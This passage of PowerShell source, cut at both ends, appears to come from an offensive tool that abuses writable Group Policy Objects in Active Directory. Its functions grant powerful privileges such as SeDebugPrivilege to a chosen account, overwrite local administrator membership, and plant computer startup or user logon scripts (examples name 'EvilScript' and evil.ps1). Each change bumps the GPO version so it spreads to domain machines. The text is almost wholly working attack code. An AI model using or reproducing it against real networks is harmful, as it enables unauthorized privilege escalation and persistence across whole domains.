                                    $new_values[$k] = $test2[0]
                                    foreach ($val in $toSort) {
                    
                                        $new_values[$k] += " " + $val; 
                                    }
                                }
                            }
                        }
                    
                        $new_values = $new_values | Sort-Object
                        $new_values2 = New-Object System.Collections.Generic.List[System.Object]
                    
                        for ($i = 0; $i -lt $new_values.Count; $i++) {
                    
                            if (-not ($new_values[$i] -eq "")) {
                    
                                $value1 = $new_values[$i].Split()
                                $new_val = ""
                                foreach ($string in $value1) {
                    
                                    $new_val += "{" + $string + "}"
                                }
                    
                                $new_val = "[" + $new_val + "]"
                                $new_values2.Add($new_val)
                            }
                        }
                    }

                    $GPOADSI."$($properties[2])" = -join $new_values2
                } else {
    
                    $GPOADSI."$($properties[2])" = -join @([System.String]$entryToUpdate,"[{", $val1, "}{", $val2, "}{", $val3, "}]")
                }
            }
            catch {
                        
                $GPOADSI."$($properties[2])" = -join @([System.String]$entryToUpdate,"[{", $val1, "}{", $val2, "}{", $val3, "}]")
            }
        }
        Write-Verbose "Updating GPT.ini"

        $content = Get-Content -Path $Path
        $new_content = ""
        foreach ($line in $content) {
    
            if ($line.Contains("Version=")) {
    
                $line = $line -split "="
                $line[1] = $new_ver.ToString()
                $line = -join @($line[0],"=",$line[1])
            }
            $new_content = -join @($new_content, "$line $([System.Environment]::NewLine)")
        }
        Set-Content -Value $new_content -Path $Path
    }
        
    END {
        
        $GPOADSI.CommitChanges()
        Write-Host -ForegroundColor Green "[+] The version number in GPT.ini was increased successfully."
    }
}

function Add-UserRights {

<#

    .SYNOPSIS

        Add rights to a user account.

    .DESCRIPTION

        Add a specified right assignment to a specified user account.

    .PARAMETER Rights

        Set the new rights to add to a user. Comma separated list must be used.

    .PARAMETER Identity

        Set the samaccountname/SID/disguishedname/LDAP Path to add the new rights.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-UserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-UserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-UserRights -Rights "SeLoadDriverPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

#>

    [CmdletBinding()]
    
    param (

        [ValidateSet("SeTrustedCredManAccessPrivilege","SeNetworkLogonRight","SeTcbPrivilege","SeMachineAccountPrivilege","SeIncreaseQuotaPrivilege","SeInteractiveLogonRight","SeRemoteInteractiveLogonRight","SeBackupPrivilege","SeChangeNotifyPrivilege","SeSystemtimePrivilege","SeTimeZonePrivilege","SeCreatePagefilePrivilege","SeCreateTokenPrivilege","SeCreateGlobalPrivilege","SeCreatePermanentPrivilege","SeCreateSymbolicLinkPrivilege","SeDebugPrivilege","SeDenyNetworkLogonRight","SeDenyBatchLogonRight","SeDenyServiceLogonRight","SeDenyInteractiveLogonRight","SeDenyRemoteInteractiveLogonRight","SeEnableDelegationPrivilege","SeRemoteShutdownPrivilege","SeAuditPrivilege","SeImpersonatePrivilege","SeIncreaseWorkingSetPrivilege","SeIncreaseBasePriorityPrivilege","SeLoadDriverPrivilege","SeLockMemoryPrivilege","SeBatchLogonRight","SeServiceLogonRight","SeSecurityPrivilege","SeRelabelPrivilege","SeSystemEnvironmentPrivilege","SeManageVolumePrivilege","SeProfileSingleProcessPrivilege","SeSystemProfilePrivilege","SeUndockPrivilege","SeAssignPrimaryTokenPrivilege","SeRestorePrivilege","SeShutdownPrivilege","SeSyncAgentPrivilege","SeTakeOwnershipPrivilege")]
        [String]
        $Rights,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Identity,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['Identity'] = $Identity
        $UserSid = Get-UserSid @arguments
        $arguments.Remove('Identity')
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'
    }

    PROCESS {

        $text = @'
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$"
Revision = 1
[Privilege Rights]
'@
        $right_line = @"
"@
        foreach ($right in ($Rights -split ",")) {

            $toAdd = @"

$right = *$UserSid
"@
            $right_line = -join @($right_line, $toAdd)
            $text = -join @($text, $toAdd)
        }
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = @($env:LOGONSERVER, $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs 
        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, '\GPT.ini')

        if ((Test-Path -Path $GPOInipath )) {
        
            $path = -join @($GPOpath, '\Machine\Microsoft\Windows NT\SecEdit\')
        } else {
            
            Write-Host -ForegroundColor red -BackgroundColor black "[!] Could not find the specified GPO!"
            return
        }
            
        if (-not (Test-Path -Path $path )) {
            
            $null = New-Item -Path $path -ItemType Directory  
        }
        $path = -join @($path, 'GptTmpl.inf')
        if (Test-Path -Path $path ) {
            
            $exists = $false
            Write-Host -ForegroundColor Green "[+] File exists: $path"
            $content = Get-Content -Path $path

            foreach ($line in $content) {

                if ($line.Contains('[Privilege Rights]')) {

                    $exists = $true
                }
            }

            if ($exists) {

                Write-Host -ForegroundColor Red -BackgroundColor Black "[!] The GPO already specifies user rights. Select a different attack."
                return
            } else {

                Write-Host -ForegroundColor Green "[+] The GPO does not specify any user rights. Adding new rights..."
                $stringContent = $content | Out-String
                $stringContent = -join @($stringContent, $right_line)
                Set-Content -Path $path -Value $stringContent
                $arguments = @{}
                $arguments['Credential'] = $Credential
                $arguments['Path'] = $GPOInipath
                $arguments['LDAPPath'] = $LDAPPath
                $arguments['GPOIdentity'] = $GPOIdentity
                $arguments['Function'] = "AddNewRights"
                $arguments['ObjectType'] = "Computer"
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                Update-GPOVersion @arguments
            }
        } else {

            Write-Host -ForegroundColor Green "[+] Creating file $path"
            $null = New-Item -Path $path -ItemType File -Force
            Set-Content -Path $path -Value $text 
            $arguments = @{}
            $arguments['Credential'] = $Credential
            $arguments['Path'] = $GPOInipath
            $arguments['LDAPPath'] = $LDAPPath
            $arguments['GPOIdentity'] = $GPOIdentity
            $arguments['Function'] = "AddNewRights"
            $arguments['ObjectType'] = "Computer"
            if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
            Update-GPOVersion 
        }
        Write-Host -ForegroundColor green "[+] The GPO was modified to assign new rights to target user. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}

function Add-LocalAdmin {

<#

    .SYNOPSIS

        Add a new local admin. This will replace any existing local admins!

    .PARAMETER Identity

        Set the samaccountname/SID/disguishedname/LDAP Path of the account to be added in local admins.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

#>  
    
    [CmdletBinding()]

    param (

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $Identity,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['Identity'] = $Identity
        $UserSid = Get-UserSid @arguments
        $arguments.Remove('Identity')
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'
    }

    PROCESS {

        $start = @'
[Unicode]
Unicode=yes
[Version]
signature="$CHICAGO$
Revision=1
'@
        $text = @("[Group Membership]", "*S-1-5-32-544__Memberof =", "*S-1-5-32-544__Members = *$UserSid")
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = -join @($env:LOGONSERVER, ".", $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs
        $GPOPath = -join @($share, ":")
        $GPOInipath = -join @($GPOPath, '\GPT.ini')

        if (Test-Path -Path $GPOInipath ) {
        
            $path = -join @($GPOpath, '\Machine\Microsoft\Windows NT\SecEdit\')
        } else {
            
            Write-Host -ForegroundColor red -BackgroundColor black "[!] Could not find the specified GPO!"
            return
        }
            
        if (-not (Test-Path -Path $path )) {
            
            $null = New-Item -ItemType Directory -Path $path
        }
        $path = -join @($path, 'GptTmpl.inf')
        if (Test-Path -Path $path ) {
            
            $exists = $false
            Write-Host -ForegroundColor Green "[+] File exists: $path"
            $content = Get-Content -Path $path 

            foreach ($line in $content) {

                if (($line -match '[Group Membership]')) {

                    $exists = $true
                }
            }

            if ($exists -and (-not $Force)) {

                Write-Host -ForegroundColor red -BackgroundColor black "[!] Group Memberships are already defined in the GPO. Use -Force to make changes. This option might break the affected systems!"
                return
            } elseif ($exists -and $Force) {
                    
                foreach ($line in $content) {

                    if (($line.Replace(" ", "").Contains('*S-1-5-32-544__Members='))) {
    
                        if (($line.Replace(" ", "").Contains('*S-1-5-32-544__Members=')) -and (-not ($line.Replace(" ", "").Equals('*S-1-5-32-544__Members=')))) {

                            $content[$content.IndexOf($line)] = -join @($line, ", *", $UserSid)
                        } elseif (($line.Replace(" ", "").Contains('*S-1-5-32-544__Members=')) -and (($line.Replace(" ", "").Equals('*S-1-5-32-544__Members=')))) {
                                
                            $content[$content.IndexOf($line)] = -join @($line, " *", $UserSid)
                        } 
                    } else {

                        continue
                    }
                }
                Set-Content -Path $path -Value $content
                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                $arguments['Path'] = $GPOInipath
                $arguments['LDAPPath'] = $LDAPPath
                $arguments['GPOIdentity'] = $GPOIdentity
                $arguments['Function'] = "AddLocalAdmin"
                $arguments['ObjectType'] = "Computer"
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                Update-GPOVersion @arguments            

            } else {

                return 
            }
        } else {

            Write-Host -ForegroundColor Green "[+] Creating file $path"
            $null = New-Item -Path $path -ItemType File -Force
            $new_text = -join $start,$text
            Set-Content -Path $path -Value $new_text
            $arguments = @{}
            if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
            $arguments['Path'] = $GPOInipath
            $arguments['LDAPPath'] = $LDAPPath
            $arguments['GPOIdentity'] = $GPOIdentity
            $arguments['Function'] = "AddLocalAdmin"
            $arguments['ObjectType'] = "Computer"
            if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
            Update-GPOVersion @arguments
        }
        Write-Host -ForegroundColor green "[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}

function Add-ComputerScript {

<#

    .SYNOPSIS

        Add a new computer startup script.

    .PARAMETER ScriptName

        Set the name of the new startup script.

    .PARAMETER ScriptContent

        Set the contents of the new startup script.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-ComputerScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-ComputerScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-ComputerScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

#>

    [CmdletBinding()]

    param (

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $ScriptName,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $ScriptContent,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $Hidden_path = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'
    }

    PROCESS {

        $Hidden_ini = @"
[Startup]
0cmdline=$ScriptName
0parameter=
"@
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = -join @($env:LOGONSERVER, ".", $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs
        $GPOPath = -join @($share, ":")
        $GPT_path = -join @($GPOPath, '\GPT.ini')

        if (Test-Path -Path $GPOPath) {

            $path = -join @($GPOPath, "\Machine\Scripts\Startup\")
            $Hidden_path = -join @($Hidden_path, "\Machine\Scripts\scripts.ini")
        } else {

            Write-Host -ForegroundColor Red -BackgroundColor Black "[!] Could not find the specified GPO!"
            return
        }
    
        if (-not (Test-Path -Path $path)) {
    
            $null = New-Item -ItemType Directory -Path $path
        }
        $path = -join @($path, $ScriptName)
        if (Test-Path -Path $path) {
    
            Write-Host -ForegroundColor red -BackgroundColor black "[!] A Startup script with the same name already exists. Choose a different name."
            return
        }
    
        if (Test-Path -Path $Hidden_path) {
    
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes 
            $attributes = ""
            foreach ($attribute in (($fileattributes | Out-String) -split ",")) {
                    
                if (-not ($attributes.Replace(" ", "") -eq "Hidden")) {
    
                    $attributes = -join @($attributes, "$($attributes.Replace(' ', '')),")
                } else {
    
                    Continue
                }
                
            }
    
            $attributes = $attributes.SubString(0, ($attributes.Length - 1))
            $fileattributes = $attributes
    
            $line = ""
            $new_list = @()
            $content = Get-Content -Path $Hidden_path
            foreach ($line in $content) {
                    
                $new_list.Add($line)
            }

            $first_element = @()
            $q = ""
            foreach ($item in $new_list) {
                    
                try {
                        
                    $q = ($item[0].ToString()) -replace "[^0-9]", ""
                    $first_element.Add([System.Int32]$q)
                }
                catch {
                        
                    Continue
                }
            }

            $max = [System.String](($first_element | Measure-Object -Maximum).Maximum + 1)
            $Hidden_ini = @"
$(-join @($max, "Cmdline"))=$ScriptName
$(-join @($max, "Parameter"))=
"@
            $new_list.Add($toAdd)
            $string_to_add = ""
            foreach ($string in $new_list) {

                $string_to_add = -join @($string_to_add, "$string $([System.Environment]::NewLine)")
            }
            Set-Content -Path $Hidden_path -Value $string_to_add 
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes
            $fileattributes = -join @(($fileattributes | Out-String) , ", Hidden")

        } else {

            Set-Content -Path $Hidden_path -Value $Hidden_ini 
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes
            $fileattributes = -join @(($fileattributes | Out-String) , ", Hidden")
        }

        Write-Host -ForegroundColor green "[+] Creating new startup script..."
        $null = New-Item -Path $path -ItemType File -Force
        Set-Content -Path $path -Value $ScriptContent

        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        $arguments['LDAPPath'] = $LDAPPath
        $arguments['ObjectType'] = 'Computer'
        $arguments['Path'] = $GPT_path
        $arguments['GPOIdentity'] = $GPOIdentity
        $arguments['Function'] = 'NewStartupScript'
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true} 
        Update-GPOVersion @arguments
        Write-Host -ForegroundColor green "[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle."
    }

    END {

        Write-Verbose "Removing drive $share."
        Remove-PSDRive -Name $share
    }
}

function Add-UserScript {

<#

    .SYNOPSIS

        Add a new user startup script.

    .PARAMETER ScriptName

        Set the name of the new startup script.

    .PARAMETER ScriptContent

        Set the contents of the new startup script.

    .PARAMETER GPOIdentity

        The displayname/LDAP Path/disguishedname/name of the vulnerable GPO.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER Force

        Overwrite existing files if required.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com' -Credential $cred

    .EXAMPLE

        Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO' -Domain 'contoso.com'

    .EXAMPLE

        Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

#>

    [CmdletBinding()]
    
    param (

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $ScriptName,

        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $ScriptContent,
        
        [Parameter(ValueFromPipeline=$true, Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Switch]
        $Force,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        if ($PSBoundParameters['Credential']) {
            if (-not(($Credential.UserName).Contains('\'))) {

                $Credential = New-Object System.Management.Automation.PSCredential(-join @($env:USERDOMAIN,"\", $Credential.UserName), $Credential.GetNetworkCredential().SecurePassword)
            }
        }
        $commonArgs = @{}
        if ($PSBoundParameters['Credential']) {$commonArgs['Credential'] = $Credential}
        if ($VerbosePreference -eq "Continue") {$commonArgs['Verbose'] = $true}
        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Credential}
        if ($PSBoundParameters['DomainController']) {$arguments['DomainController'] = $DomainController}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $arguments['GPOIdentity'] = $GPOIdentity
        $TempGPOGuid = Get-GPOPath @arguments
        $GPOPath = $Hidden_path = $TempGPOGuid[1]
        $LDAPPath = $TempGPOGuid[2]
        Remove-Variable -Name 'TempGPOGuid'        
    }

    PROCESS {

        $Hidden_ini = @"
[Startup]
0cmdline=$ScriptName
0parameter=
"@
        $share = -join ((65..90) + (97..122) | Get-Random -Count 6 | ForEach-Object {[System.Char]$_})
        if ($env:LOGONSERVER) {

            $GPOPath = -join @($env:LOGONSERVER, ".", $GPOPath.SubString(2))
        } else {

            if ($PSBoundParameters['DomainController']) {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $arguments['Identity'] = $DomainController
                $DC = Get-DomainController @arguments
            } else {

                $arguments = @{}
                if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
                if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
                if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
                $DC = Get-DomainController @arguments
            }
            $secondBackslash = $GPOPath.SubString(2).IndexOf('\')
            $GPOPath = -join @("\\$DC", $GPOPath.SubString(2).SubString($secondBackslash))
        }
        $null = New-PSDrive -PSProvider FileSystem -Name $share -Root $GPOPath @commonArgs
        $GPOPath = -join @($share, ":")
        $GPT_path = -join @($GPOPath, '\GPT.ini')

        if (Test-Path -Path $GPOPath) {

            $path = -join @($GPOPath, "\User\Scripts\Logon\")
            $Hidden_path = -join @($Hidden_path, "\User\Scripts\scripts.ini")
        } else {

            Write-Host -ForegroundColor Red -BackgroundColor Black "[!] Could not find the specified GPO!"
            return
        }
    
        if (-not (Test-Path -Path $path)) {
    
            $null = New-Item -ItemType Directory -Path $path
        }
        $path = -join @($path, $ScriptName)
        if (Test-Path -Path $path) {
    
            Write-Host -ForegroundColor red -BackgroundColor black "[!] A Startup script with the same name already exists. Choose a different name."
            return
        }
    
        if (Test-Path -Path $Hidden_path) {
    
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes 
            $attributes = ""
            foreach ($attribute in (($fileattributes | Out-String) -split ",")) {
                    
                if (-not ($attributes.Replace(" ", "") -eq "Hidden")) {
    
                    $attributes = -join @($attributes, "$($attributes.Replace(' ', '')),")
                } else {
    
                    Continue
                }
                
            }
    
            $attributes = $attributes.SubString(0, ($attributes.Length - 1))
            $fileattributes = $attributes
    
            $line = ""
            $new_list = @()
            $content = Get-Content -Path $Hidden_path
            foreach ($line in $content) {
                    
                $new_list.Add($line)
            }

            $first_element = @()
            $q = ""
            foreach ($item in $new_list) {
                    
                try {
                        
                    $q = ($item[0].ToString()) -replace "[^0-9]", ""
                    $first_element.Add([System.Int32]$q)
                }
                catch {
                        
                    Continue
                }
                }

            $max = [System.String](($first_element | Measure-Object -Maximum).Maximum + 1)
            $Hidden_ini = @"
$(-join @($max, "Cmdline"))=$ScriptName
$(-join @($max, "Parameter"))=
"@
            $new_list.Add($toAdd)
            $string_to_add = ""
            foreach ($string in $new_list) {

                $string_to_add = -join @($string_to_add, "$string $([System.Environment]::NewLine)")
            }
            Set-Content -Path $Hidden_path -Value $string_to_add
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes
            $fileattributes = -join @(($fileattributes | Out-String) , ", Hidden")

        } else {

            Set-Content -Path $Hidden_path -Value $Hidden_ini 
            $fileattributes = (Get-Item -Path $Hidden_path).Attributes
            $fileattributes = -join @(($fileattributes | Out-String) , ", Hidden")
        }

        Write-Host -ForegroundColor green "[+] Creating new startup script..."
        $null = New-Item -Path $path -ItemType File -Force
        Set-Content -Path $path -Value $ScriptContent

        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        $arguments['LDAPPath'] = $LDAPPath
        $arguments['ObjectType'] = 'User'
        $arguments['Path'] = $GPT_path
        $arguments['GPOIdentity'] = $GPOIdentity
        $arguments['Function'] = 'NewStartupScript'
